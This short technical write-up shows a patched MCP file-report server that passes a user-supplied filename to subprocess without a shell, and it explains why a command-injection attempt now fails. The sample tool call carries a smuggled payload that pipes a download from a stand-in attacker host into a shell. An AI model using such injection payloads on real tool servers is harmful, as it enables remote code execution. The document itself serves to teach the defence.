# MCP server: file-report-tool, STDIO transport (patched)

Same server, transport layer updated to a patched SDK release using a
parameterized subprocess API.

```python
# transport.py — patched STDIO handler
import subprocess

def handle_tool_call(tool_name: str, params: dict):
    filename = params.get("filename", "")
    # Argument passed as an array element, never interpolated into a
    # shell string. No shell is invoked at all.
    subprocess.run(["cat", filename], shell=False)
```

The same tool call:

```json
{
  "tool": "read_file",
  "params": { "filename": "report.txt; curl attacker.example/x | sh" }
}
```

is treated as a single, literal filename argument. `cat` fails with
"file not found" because no file has that exact name containing a
semicolon; no shell ever parses the string, so nothing after the
semicolon executes.
